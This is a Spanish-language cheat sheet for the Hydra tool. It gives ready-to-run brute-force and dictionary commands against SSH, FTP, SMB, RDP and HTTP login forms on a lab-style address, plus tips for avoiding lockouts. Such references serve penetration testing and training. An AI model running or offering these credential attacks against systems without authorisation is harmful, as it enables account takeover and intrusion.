# Hydra Cheat Sheet

Comandos rápidos para ataques de fuerza bruta y diccionarios con Hydra a múltiples servicios (SSH, FTP, SMB, HTTP-FORM, RDP).

---

## 1. Sintaxis Básica de Hydra

```bash
hydra [OPCIONES] <IP_OBJETIVO> <SERVICIO>
```

### Opciones más comunes:
* `-l <USUARIO>` : Especificar un usuario único.
* `-L <LISTA_USUARIOS>` : Especificar un diccionario de usuarios.
* `-p <PASSWORD>` : Especificar una contraseña única.
* `-P <LISTA_PASSWORDS>` : Especificar un diccionario de contraseñas (ej. `/usr/share/wordlists/rockyou.txt`).
* `-t <HILOS>` : Número de conexiones concurrentes (por defecto 16).
* `-s <PUERTO>` : Especificar un puerto no estándar.
* `-v` / `-V` : Modo verboso / Mostrar cada intento de login.
* `-f` : Salir inmediatamente tras encontrar el primer par de credenciales válidas.

---

## 2. Ejemplos por Servicio

### SSH (Puerto 22)
```bash
# Usuario conocido, probar diccionario de contraseñas
hydra -l admin -P /usr/share/wordlists/rockyou.txt -t 4 -f 10.10.10.50 ssh

# Probar listas de usuarios y contraseñas
hydra -L users.txt -P rockyou.txt -t 4 -f 10.10.10.50 ssh
```

### FTP (Puerto 21)
```bash
hydra -l anonymous -P rockyou.txt -t 16 10.10.10.50 ftp
hydra -L users.txt -P passwords.txt -t 16 10.10.10.50 ftp
```

### SMB (Puerto 445)
```bash
hydra -l Administrator -P rockyou.txt -t 4 10.10.10.50 smb
```

### RDP (Puerto 3389)
```bash
hydra -l Administrator -P rockyou.txt -t 4 -V 10.10.10.50 rdp
```

### HTTP GET Auth / Basic Authentication (Web con ventana emergente de login)
```bash
hydra -l admin -P rockyou.txt 10.10.10.50 http-get /admin/
```

### HTTP POST Form (Formularios Web de Login)
```bash
# Sintaxis: "URL:parametros_post:mensaje_error"
hydra -l admin -P rockyou.txt 10.10.10.50 http-post-form "/login.php:username=^USER^&password=^PASS^:Login failed"
```

---

## 3. Consejos OPSEC y Rendimiento
* En **SSH y RDP**, mantén los hilos (`-t`) bajos (4 a 8) para evitar bloqueos de puerto o fallos de timeout.
* Utiliza la opción `-f` para detener el ataque inmediatamente cuando se encuentre una credencial válida.
* Para reanudar una sesión interrumpida de Hydra, utiliza la opción `-R`:
  ```bash
  hydra -R
  ```
